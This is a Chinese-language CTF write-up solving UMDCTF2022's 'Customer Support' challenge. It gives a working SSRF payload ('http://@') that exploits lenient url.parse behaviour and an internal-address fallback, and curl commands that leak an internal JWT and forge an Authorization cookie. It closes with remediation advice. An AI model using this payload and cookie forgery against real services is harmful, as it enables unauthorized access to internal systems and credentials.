# UMDCTF2022 Customer Support Writeup

## 题目简述

客服表单会从消息中提取最后一个 URL，解析主机名并由服务端发起请求。代码只在原始字符串中拦截 `localhost`、`127.0.0.1` 和 `0.0.0.0`，却在解析不到主机名时主动回退到内部微服务地址。利用 Node.js 旧版 `url.parse` 对空主机 URL 的宽松解析，可以触发 SSRF，读取内部认证令牌，再伪造 Cookie 取得 flag。

## 解题过程

URL 提取与请求逻辑为：

```typescript
const cs = c(req.body.message);
const u = parse(cs);

t = u.hostname
  ? (await lookup(u.hostname)).address
  : `${process.env.MICROSERVICE}`;

return fetch(`${u.protocol}//${t}`, {method: "GET"});
```

构造：

```text
http://@
```

它符合提取正则 `https?://[^\s]+`，也不含三个被禁止的地址字符串。Node.js 的旧 `url.parse("http://@")` 会得到：

```text
protocol = "http:"
hostname = ""
```

由于 `hostname` 为空，程序把 `t` 设为环境变量 `MICROSERVICE`：

```text
localhost:36768/a8354941cf54edd9b780b4d6498ed419
```

最终请求正好指向内部微服务的隐藏路由。发送完整表单：

```bash
curl -s http://challenge/api/contact \
  -H 'Content-Type: application/json' \
  --data '{
    "name":"a",
    "email":"a@b.c",
    "subject":"help",
    "message":"http://@"
  }'
```

响应的 `body` 中包含微服务返回的 JWT：

```json
{"token":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."}
```

主站 `/api/auth` 不验证 JWT 签名或声明，只要求名为 `Authorization` 的 Cookie 与环境变量 `TOKEN` 完全相等。主站保存的值比微服务返回值多一个 `Bearer ` 前缀，因此请求：

```bash
curl -s http://challenge/api/auth \
  --cookie "Authorization=Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
```

即可得到：

```text
UMDCTF{I_b3t_th@t_c00kie_t4sted_g00d_d!dnt_it!U4L_p4rs1ng_suck5}
```

## 方法总结

本题不是 DNS rebinding，而是 URL 解析结果为空时的危险默认值。过滤发生在原始文本层，实际请求目标却由解析后的字段和内部环境变量重新拼接，两者语义不一致。修复时应使用 WHATWG `URL` 严格解析，解析失败直接拒绝，并在连接前后都验证最终 IP、端口和重定向目标；更不能把内部服务地址作为空主机的回退值。
